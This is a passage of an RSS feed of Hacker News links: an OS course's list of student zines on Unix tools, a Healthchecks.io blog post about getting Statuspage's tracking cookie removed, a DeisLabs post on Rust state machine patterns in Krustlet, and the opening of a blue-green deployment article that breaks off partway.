      <p><a href="https://nipunbatra.github.io/os2020/Zines/chmod.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hPdjCsrAHTRImBf1kV4ACBW6W7_d-LQW/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CODEC.png" alt="">
    </p>
    <div>
      <h3><b>CODEC</b></h3>
      <p>Utsav Jethva	&amp; Shweta Pardeshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CODEC.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1hONumvnnPV0CgGxVfA_hHYALUTYW3z5M/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/CRON.png" alt="">
    </p>
    <div>
      <h3><b>CRON</b></h3>
      <p>Chandrahas	Rama &amp; Krishna Reddy</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/CRON.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1Z2CStAdJYa24N7Y5RMUe96QC-qzS9PuQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/cross_compilation.png" alt="">
    </p>
    <div>
      <h3><b>Cross Compilation</b></h3>
      <p>Urvishkumar Patel &amp; Tanmaey Gupta</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/cross_compilation.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1bp6xTXdZ2ij53xyr7stgi6vtDwi9SKBE/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Curl.png" alt="">
    </p>
    <div>
      <h3><b>Curl</b></h3>
      <p>Akshay Biju &amp; Avinash Karanam</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Curl.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dUGubQh7Yicwlvc0egKprEb6mLeCjPFg/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/DD.png" alt="">
    </p>
    <div>
      <h3><b>Data Duplicator</b></h3>
      <p>Dhanya Sree &amp;  Manisha</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/DD.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/12Z3TS4XU4XJzAHtQN0UkEPN2pp0EMgJi/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Docker.png" alt="">
    </p>
    <div>
      <h3><b>Docker</b></h3>
      <p>Shivam Sahni &amp;  Dishank Goel</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Docker.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1dEj3UBFZgRYY0sjoV1cTKbJeVYtuivsS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Dotfiles.png" alt="">
    </p>
    <div>
      <h3><b>Dotfiles</b></h3>
      <p>G Harshavardhan &amp;  Pittala Nikhil</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Dotfiles.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1f59tv18sSqNwara8oo2YVoT_3II4Ww5l/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.png" alt="">
    </p>
    <div>
      <h3><b>Environment Variable</b></h3>
      <p>Prasad Athave &amp;  Siddharth Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ENV_VAR.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1iKiV5BTdzG7UKPnsVfD-c3utEig3KHgc/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/gdb.png" alt="">
    </p>
    <div>
      <h3><b>gdb</b></h3>
      <p>Dhruvi Lodhavia &amp;  Udit Vyas</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/gdb.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1APC_H_ogNgClvDlawFrSObP4dcSm_5Kf/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GREP.png" alt="">
    </p>
    <div>
      <h3><b>GREP</b></h3>
      <p>Priyam Tongia &amp;  Mihir Jain</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GREP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jgOq0CNteDyv9UwqmatrgtFyMzLfnKoY/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/GZIP.png" alt="">
    </p>
    <div>
      <h3><b>GZIP</b></h3>
      <p>Kalyan  &amp;  Shahid</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/GZIP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1uJ78nyH_btQ4q5DU9bFLjOADJPrFLj-9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.png" alt="">
    </p>
    <div>
      <h3><b>Make File</b></h3>
      <p>Kushagra Sharma  &amp;  Aditya Tripathi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/MAKE_FILE.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1lHeeE7Ib0-2riTf3Y1m_zwtMkUDSQBwu/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/man.png" alt="">
    </p>
    <div>
      <h3><b>Man</b></h3>
      <p>Vedant Bhutani &amp;  Ojas Mithbavkar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/man.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1oY0gE0SyTdnBQ33XUhRqXk9Qow3K3h_9/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Mount.png" alt="">
    </p>
    <div>
      <h3><b>Mount</b></h3>
      <p>Abhavya Chandra &amp;  Shubham Deshpande</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Mount.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/17qzY44lbL0CmD69Po7HnM1bFXUkvRAx-/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Nohup.png" alt="">
    </p>
    <div>
      <h3><b>Nohup</b></h3>
      <p>Aditya Pusalkar &amp;  Pushkar Mujumdar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Nohup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1BsOSQwzfo4Y-oqocBOPz1v5UT89wpSkH/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/nslookup.png" alt="">
    </p>
    <div>
      <h3><b>nslookup</b></h3>
      <p>Ajinkya Pawar &amp;  Jitender Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/nslookup.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/19JlHAFJGVz515C6WyGOufZ0tQB_Kf1JU/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/OS_Python.png" alt="">
    </p>
    <div>
      <h3><b>OS Python</b></h3>
      <p>Amey Kulkarni &amp;  Chris Francis</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/OS_Python.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1gHbMbr064SxUK1aOY0k0MSjXrRrYLmRS/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/peggit.png" alt="">
    </p>
    <div>
      <h3><b>Peggit</b></h3>
      <p>Janvi Thakkar &amp;  Aishna Agrawal</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/peggit.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1jv3JHauQ-NFFxL1-z77bsg4bd9Ef_e14/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/ping.png" alt="">
    </p>
    <div>
      <h3><b>Ping</b></h3>
      <p>Raghav Goyal &amp;  Devvrat Joshi</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/ping.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1KTo_GnLo5Lk33j1vJRp99niGuG1dJsQv/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/pipe.png" alt="">
    </p>
    <div>
      <h3><b>Pipes</b></h3>
      <p>Harsh Shah &amp;  Madhav Tiwari</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/pipe.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SED.png" alt="">
    </p>
    <div>
      <h3><b>SED</b></h3>
      <p>Ronak Kaoshik &amp;  Deepika Soni</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SED.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1wLoi0Fw0P2eN9pCjeGKjLOcQtNmfrGmI/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SFTP.png" alt="">
    </p>
    <div>
      <h3><b>SFTP</b></h3>
      <p>Viraj Shah &amp;  Vrutik Shah</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SFTP.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1_vuoQw64f8qxhGwfkJhPRIL6FM9PFvX_/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.png" alt="">
    </p>
    <div>
      <h3><b>Sort and Uniq</b></h3>
      <p>Nishikant Parmar &amp;  Sachin Yadav</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SORT_UNIQ.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1u_4qVfko5kEyhPOBp8iNWaVbtncoPhTO/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSDS.png" alt="">
    </p>
    <div>
      <h3><b>SSDS</b></h3>
      <p>Varun Jain &amp;  Arpita Kabra</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSDS.pdf">[Poster]</a>     <a href="">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/SSH.png" alt="">
    </p>
    <div>
      <h3><b>SSH</b></h3>
      <p>Harsh Patel &amp;  Palak Purohit</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/SSH.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1V1ou72qCVmTSSOmDJTJEPcyyLSF7F_2g/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/tar.png" alt="">
    </p>
    <div>
      <h3><b>Tar</b></h3>
      <p>Vivek Modi  &amp;  Shruti Katpara</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/tar.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1x-Mgglk0W2Xz3-NSwpEt74iZMGM045qh/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Traceroute.png" alt="">
    </p>
    <div>
      <h3><b>Traceroute</b></h3>
      <p>Rwik Rana &amp;  Harshit Kumar</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Traceroute.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/11mPNAKAXZHaBM_UoznSEZcW6TVH_osOl/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/Valgrind.png" alt="">
    </p>
    <div>
      <h3><b>Valgrind</b></h3>
      <p>Abhinav Singh &amp;  Bikramjot Singh Dhindsa</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/Valgrind.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1HpXGbFqlU-w7o6WIjGNB1MT0W6jC1WY5/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/VIM.png" alt="">
    </p>
    <div>
      <h3><b>VIM</b></h3>
      <p>Shril mody &amp;  hetvi shastri</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/VIM.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1sot_LDAZBRTTdtZHbKBNJxWmJQ8B0RlQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>

  </article></div>]]>
            </description>
            <link>https://nipunbatra.github.io/os2020/zine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582973</guid>
            <pubDate>Thu, 24 Sep 2020 20:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[About Tracking Cookies on Status.healthchecks.io]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582911">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/ | <a href="https://web.archive.org/web/*/https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-671" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p><a href="https://status.healthchecks.io/">status.healthchecks.io</a> used to set an ‚Äúajs_anonymous_id‚Äù tracking cookie. I‚Äôm happy to report that it does not do that anymore since September 22, 2020. In this post, I‚Äôll share the process I went through to get the tracking cookie removed.</p>
<p>For powering status.healthchecks.io, I am using a third-party hosted status page provider, Statuspage.io, by Atlassian. I initially set it up in May 2020 and <a href="https://blog.healthchecks.io/2020/05/healthchecks-io-status-page-facelift/">wrote about it on this blog</a>. After the setup, while poking around, I discovered my fancy new status page sets a tracking cookie. It does not ask for the user‚Äôs consent, and it does not obey the ‚ÄúDNT‚Äù header ‚Äì when you visit the page, you get a tracking cookie.&nbsp;</p>
<p>I believe this cookie was only used for innocuous purposes (tracking the number of unique page visitors), but it still invades site visitors‚Äô privacy and violates GDPR requirements. On May 7, I submitted a support ticket asking to remove the tracking cookie and got a reply with a bottom line: ‚ÄúWe can‚Äôt avoid setting these cookies.‚Äù After asking again, I got back a non-commital ‚ÄúI will forward this to our product team and development team,‚Äù and that was that.&nbsp;</p>
<p>I had already invested a significant amount of time setting up automation and custom metrics for the status page. And, aside from the cookie issue, I was generally happy with the product. Before switching providers over this one issue, I wanted to take a crack at fixing it. It was unlikely Atlassian would spend any engineering resources just because a single $29/mo customer had complaints. So I needed to bump up the priority of the issue. I searched around for other Statuspage.io customers and started contacting them. My email template went through several iterations until I got to a version that felt transparent and not manipulative:</p>

<blockquote><p>Subject: Cookies on status.somedomain.com<br>Hello,</p><p>when I visit status.somedomain.com I see it stores the following cookies in my browser:</p><p>* ajs_anonymous_id<br>* ajs_group_id</p><p>These are Atlassian‚Äôs tracking cookies. They are not essential, and so under GDPR they require the user‚Äôs explicit opt-in before they can be sent to the browser.</p><p>I am an Atlassian Statuspage customer myself, and my service‚Äôs status page has the exact same problem. I‚Äôve contacted Atlassian about this but this appears to be low priority for them.</p><p>I am contacting you because I think more affected customers being aware of the issue and asking Atlassian to fix it = higher chance that they will actually do something.</p><p>Thanks,<br>Pƒìteris Caune</p></blockquote>
<p>I started by manually sending ten or so emails out every week. I mostly got sympathetic and cooperative responses. There were some funny ones too. For example, one guy insisted that there is no problem because he could not reproduce the issue using ‚Äúinternal methods.‚Äù Me showing him the results of several different cookie scanning services (<a href="https://cookie-script.com/">cookie-script.com</a>, <a href="https://www.cookiebot.com/en/">cookiebot.com</a>) did not sway him.</p>
<p>I kept contacting other companies, and they sometimes forwarded me the responses they were getting from Atlassian. From these responses, it didn‚Äôt look like we were making much progress. In July, two months in, I decided to amp things up. I grabbed the <a href="https://majestic.com/reports/majestic-million">Majestic Million</a> dataset with the top million websites. I wrote a script that goes through the list, and, for each website, checks if it has an Atlassian-operated ‚Äústatus‚Äù subdomain. The script produced an HTML page with filtered results and ‚Äúmailto:‚Äù links, to help me send out the emails. Side note: did you know the ‚Äúmailto:‚Äù links <a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Introduction_to_HTML/Creating_hyperlinks#Specifying_details">can specify the message body</a>?</p>
<p>To find email addresses, I found the best way was to look at each website‚Äôs privacy policy and search for the ‚Äú@‚Äù symbol. I found typical contact addresses were <strong>privacy</strong>@somedomain.com and <strong>dpo</strong>@somedomain.com (where ‚Äúdpo‚Äù stands for Data Protection Officer). On July 26-27, one by one, I sent out emails to around 200 companies.</p>
<p>The wave of new support tickets from various companies worked. Atlassian started communicating back a plan to implement a cookie consent banner in Q1 2021. Later in August, they started saying ‚Äúlate September 2020‚Äù. I held off from sending more emails and waited to see what would happen in September.</p>
<p>On September 22, I received an update from Atlassian. Instead of implementing a cookie consent banner, they decided to drop the Page Analytics feature, which was responsible for the tracking cookie.&nbsp;From my point of view, this is the best possible outcome ‚Äì no tracking cookie and no consent banner. Statuspage.io still has an option of adding a Google Analytics tag. So, there still is&nbsp;<em>a way</em>&nbsp;to track the unique visits for those who need it.&nbsp;</p>
<p>Thank you, Atlassian / Statuspage.io, for implementing this change. I appreciate it! To my contact at Atlassian support, thank you for your patience.&nbsp;</p>
<p>To everyone who also contacted Atlassian about the tracking cookies, thank you! It took a team effort, but it worked out in the end!</p>
<p>‚Äì Pƒìteris</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://blog.healthchecks.io/2020/09/about-tracking-cookies-on-status-healthchecks-io/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582911</guid>
            <pubDate>Thu, 24 Sep 2020 19:59:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Fistful of States: More State Machine Patterns in Rust]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24582900">thread link</a>) | @shred45
<br/>
September 24, 2020 | https://deislabs.io/posts/a-fistful-of-states/ | <a href="https://web.archive.org/web/*/https://deislabs.io/posts/a-fistful-of-states/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      

<p>Earlier this year, DeisLabs released Krustlet, a project to implement Kubelet
in Rust. <sup id="fnref:Fisher"><a href="#fn:Fisher">1</a></sup> <sup id="fnref:Squillace"><a href="#fn:Squillace">2</a></sup> Kubelet is the component of Kubernetes that
runs on each node which is assigned Pods by the control plane and runs them on
its node. Krustlet defines a flexible API in the <code>kubelet</code> crate, which allows
developers to build Kubelets to run new types of workloads. The project
includes two such examples, which can run Web Assembly workloads on WASI or
waSCC runtimes. <sup id="fnref:wasmtime"><a href="#fn:wasmtime">3</a></sup> <sup id="fnref:waSCC"><a href="#fn:waSCC">4</a></sup> Beyond this, I have been working to
develop a Rust Kubelet for traditional Linux containers using the Container
Runtime Interface (CRI). <sup id="fnref:krustlet-cri"><a href="#fn:krustlet-cri">5</a></sup> <sup id="fnref:CRI"><a href="#fn:CRI">6</a></sup></p>

<p>Over the last few releases, Krustlet has focused on expanding the functionality
of these Web Assembly Kubelets, such as adding support for init containers,
fixing small bugs, and log streaming. This, in turn, has built quite a bit of
interest in alternative workloads and node architectures on Kubernetes, as well
as demonstrated the many strengths of Rust for development of these types of
applications.</p>

<p>For the <code>v0.5.0</code> release, we turned our attention to the internal architecture
of Krustlet, in particular how Pods move through their lifecycle, how
developers write this logic, and how updates to the Kubernetes control plane
are handled. <sup id="fnref:Pod-Lifecycle"><a href="#fn:Pod-Lifecycle">7</a></sup> We settled upon a state machine implementation
which should result in fewer bugs and greater fault tolerance. This refactoring
resulted in substantial changes for consumers of our API; however we believe
this will result in code that is much easier to reason about and maintain. For
an excellent summary of these changes, and description of how you can migrate
code that depends on the <code>kubelet</code> crate, please see Taylor Thomas‚Äô excellent
<a href="https://github.com/deislabs/krustlet/releases/tag/v0.5.0">Release Notes</a>.
In this post I will share a deep dive into our new architecture and the
development journey which led to it.</p>

<h2 id="the-trailhead">The Trailhead</h2>

<p>Before <code>v0.5.0</code>, developers wishing to implement a Kubelet using Krustlet
primarily needed to implement the <code>Provider</code> trait, which allowed them to write
methods for handling events like <code>add</code>, <code>delete</code>, and <code>logs</code> for Pods scheduled
to that node. This offered a lot of flexibility, but was a very low-level API.
We identified a number of issues with this architecture:</p>

<ul>
<li>The entire lifecycle of a Pod was defined in 1 or 2 monolithic methods of the
<code>Provider</code> trait. This resulted in messy code and a very poor understanding
of error handling in the many phases of a Pod‚Äôs lifecycle.</li>
<li>Pod and Container status patches to the Kubernetes control plane were
scattered throughout the codebase, both in the <code>kubelet</code> crate and the
<code>Provider</code> implementations. This made it very difficult to reason about what
was actually reported back to the user and when, and involved lot of repeated
code.</li>
<li>Unlike the Go Kubelet, if Krustlet encountered an error it would report the
error back to Kubernetes and then (most of the time) end execution of the
Pod. There was no built-in notion of the reconciliation loop that one expects
from Kubernetes.</li>
<li>We recognized that a lot of these issues were left to each developer to
solve, but were things that any Kubelet would need to handle. We wanted to
move this kind of logic into the <code>kubelet</code> crate, so that each provider did
not have to reinvent things.</li>
</ul>

<h2 id="our-mission">Our Mission</h2>

<p>At its core, Kubernetes relies on declarative (mostly immutable) manifests, and
controllers which run reconciliation loops to drive cluster state to match this
configuration. Kubelet is no exception to this, with its focus being
indivisible units of work, or Pods. Kubelet simply monitors for changes to Pods
that have been assigned to it by <code>kube-scheduler</code>, and runs a loop to attempt
to run this work on its node. In fact, I would describe Kubelet as no different
from any other Kubernetes controller, except that it has the additional
first-class capability for streaming logs and exec sessions. However these
capabilities, as they are implemented in Krustlet, are orthogonal to this
discussion.</p>

<p>Our goal with this rewrite was to ensure that Krustlet would mirror the official
Kubelet‚Äôs behavior as closely as possible. We found that many details about
this behavior are undocumented, and spent considerable time running the
application to infer its behavior and inspecting the Go source code. Our
understanding is as follows:</p>

<ul>
<li>The Kubelet watches for Events on Pods that have been scheduled to it by
<code>kube-scheduler</code>.</li>
<li>When a Pod is added, the Kubelet enters a control loop to attempt to run the
Pod which only exits when the Pod is <code>Completed</code> (all containers
exit successfully) or <code>Terminated</code> (Pod is marked for deletion via the
control plane and execution is interrupted).</li>
<li>Within the control loop, there are various steps such as <code>Image Pull</code>,
<code>Starting</code>, etc., as well as back-off steps which wait some time before
retrying the Pod. At each of these steps, the Kubelet updates the control
plane.</li>
</ul>

<p>We recognized this pretty quickly as a finite-state machine design pattern,
which consists of infallible state handlers and valid state transitions. This
allows us to address the issues mentioned above:</p>

<ul>
<li>Break up the <code>Provider</code> trait methods for running the Pod into short,
single-focus state handler methods.</li>
<li>Consolidate status patch code to where a Pod enters a given state.</li>
<li>Include error and back-off states in the state graph, and only stop
attempting to execute a Pod on <code>Terminated</code> or <code>Complete</code>.</li>
<li>Move as much of this logic into <code>kubelet</code> as possible so that providers need
only focus on implementing the state handlers.
<br></li>
</ul>

<p>With this architecture it becomes very easy to understand the behavior of the
application, and strengthens our confidence that the application will not enter
undefined behavior. In addition, we felt that Rust would allow us to achieve
our goals while presenting an elegant API to developers, and with full
compile-time enforcement of our state machine rules.</p>

<h2 id="our-animal-guide">Our Animal Guide</h2>

<p>When first discussing the requirements of our state machine, and the daunting
task of integrating it with the existing Krustlet codebase, we recalled an
excellent blog post,
<a href="https://hoverbear.org/blog/rust-state-machine-pattern/">Pretty State Machine Patterns in Rust</a>,
by Ana Hobden (hoverbear), which I think has inspired a lot of Rust developers.
The post explores patterns in Rust for implementing state machines which
satisfy a number of constraints and leverage Rust‚Äôs type system. I encourage
you to read the original post, but for the sake of this discussion I will
paraphrase the final design pattern here:</p>

<pre><code>struct StateMachine&lt;S&gt; {
    state: S,
}

struct StateA;

impl StateMachine&lt;StateA&gt; {
    fn new() -&gt; Self {
        StateMachine {
            state: StateA
        }
    }
}

struct StateB;

impl From&lt;StateMachine&lt;StateA&gt;&gt; for StateMachine&lt;StateB&gt; {
    fn from(val: StateMachine&lt;StateA&gt;) -&gt; StateMachine&lt;StateB&gt; {
        StateMachine {
            state: StateB 
        }
    }
}

struct StateC;

impl From&lt;StateMachine&lt;StateB&gt;&gt; for StateMachine&lt;StateC&gt; {
    fn from(val: StateMachine&lt;StateB&gt;) -&gt; StateMachine&lt;StateC&gt; {
        StateMachine {
            state: StateC 
        }
    }
}

fn main() {
    let in_state_a = StateMachine::new();

    // Does not compile because `StateC` is not `From&lt;StateMachine&lt;StateB&gt;&gt;`.
    // let in_state_c = StateMachine::&lt;StateC&gt;::from(in_state_a);

    let in_state_b = StateMachine::&lt;StateB&gt;::from(in_state_a);

    // Does not compile because `in_state_a` was moved in the line above.
    // let in_state_b_again = StateMachine::&lt;StateB&gt;::from(in_state_a);

    let in_state_c = StateMachine::&lt;StateC&gt;::from(in_state_b);
}
</code></pre>

<p>Ana introduces a number of requirements for a good state machine
implementation, and achieves them with concise and easily interpretable code.
In particular, these requirements (some based on the definition of a state
machine, and some on ergonomics) were a high priority for us:</p>

<ul>
<li>One state at a time.</li>
<li>Capability for shared state.</li>
<li>Only explicitly defined transitions should be permitted.</li>
<li>Any error messages should be easy to understand.</li>
<li>As many errors as possible should be identified at <strong>compile-time</strong>.</li>
</ul>

<p>In the next section I will discuss some additional requirements that we
introduced and how these impacted the solution. In particular, we relaxed some
of Ana‚Äôs goals in exchange for greater flexibility, while satisfying those
listed above.</p>

<h2 id="tribulation">Tribulation</h2>

<p>We were off to a great start, but it was time to consider how we want
downstream developers to interact with our new state machine API. In
particular, while the Kubelets we are familiar with all follow roughly the same
Pod lifecycle, we wanted developers to be able to implement arbitrary state
machines for their Kubelet. For example, some workloads or architectures may
need to have additional provisioning states for infrastructure or data, or
to introduce post-run states for proper garbage collection of resources.
Additionally, it felt like an anti-pattern to have a parent method (<code>main</code> in
the example above) which defines the logic for progressing through the states,
as this felt like having two sources of truth and was not something we could
implement on behalf of our downstream developers for arbitrary state machines.
Ana had discussed how to hold the state machine in a parent structure using an
<code>enum</code>, but it felt clunky to introduce large match statements which could
introduce runtime errors.</p>

<p>We knew that to allow arbitrary state machines we would need a <code>State</code> trait to
mark types as valid states. We felt that it would be possible for this trait to
have a <code>next()</code> method which runs the state and then returns the next <code>State</code>
to transition to, and we wanted our code to be able to simply call <code>next()</code>
repeatedly to drive the machine to completion. This pattern, we soon found,
introduced a number of challenges.</p>

<pre><code>/// Rough pseudocode of our plan.

trait State {
    /// Do work for this state and return next state.
    async fn next(self) -&gt; impl State;
}

fn drive_state_machine(mut state: impl State) {
    loop {
        state = state.next().await;
    }
}
</code></pre>

<h3 id="what-does-next-return">What does <code>next()</code> return?</h3>

<p>Within our loop, we are repeatedly overwriting a local variable with
<em>different</em> types that all implement <code>State</code>. ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://deislabs.io/posts/a-fistful-of-states/">https://deislabs.io/posts/a-fistful-of-states/</a></em></p>]]>
            </description>
            <link>https://deislabs.io/posts/a-fistful-of-states/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24582900</guid>
            <pubDate>Thu, 24 Sep 2020 19:58:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blue-green deployment for a small webapp]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24582864">thread link</a>) | @caspii
<br/>
September 24, 2020 | https://keepthescore.co/blog/posts/blue-green-deployment/ | <a href="https://web.archive.org/web/*/https://keepthescore.co/blog/posts/blue-green-deployment/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>

          


<article>
  <header>
    <h2 dir="auto"><a href="https://keepthescore.co/blog/posts/blue-green-deployment/">Blue-green deployment for a simple webapp</a></h2>
    <p><time datetime="2020-09-24T00:00:00+02:00">Thu Sep 24, 2020</time> by Caspar</p>
  </header>
  

<p><img src="https://keepthescore.co/blog/blue-green-tennis.jpg" alt="Blue green tennis"></p>

<p>This is an article outlining how we deploy <a href="https://keepthescore.co/">our webapp</a>. We run our servers on DigitalOcean but this is incidental. It should work equally well for other providers too.</p>

<p>Let‚Äôs get 2 caveats out of the way first:</p>

<ol>
<li>Our CRUD application runs on one application server. If you‚Äôre using a more complex setup, then what we describe here will need to be ‚Ä¶ adjusted.</li>
<li>Like many others out there, we‚Äôre learning this stuff as we go along. Please be gentle.</li>
</ol>

<h2 id="why-we-chose-blue-green-deployment">Why we chose blue-green deployment</h2>

<p>Before we get into the details, let‚Äôs quickly look at our situation before we switched to a blue-green deployment:</p>

<ul>
<li>We had one application server running on DigitalOcean, plus a hosted Postgres database.</li>
<li>To deploy, we used a script that SSHed into that server and did a <code>git pull</code></li>
</ul>

<p>This was fine to begin with however there were several issues:</p>

<ol>
<li>Our setup (using Python Flask) compiles and minifies CSS and Javascript on the server. This can take up to 10 seconds. The result of this was that if we changed our CSS or Javascript, the server would take time to respond after deployment and some users ran into <code>Bad Gateway</code> errors üí•</li>
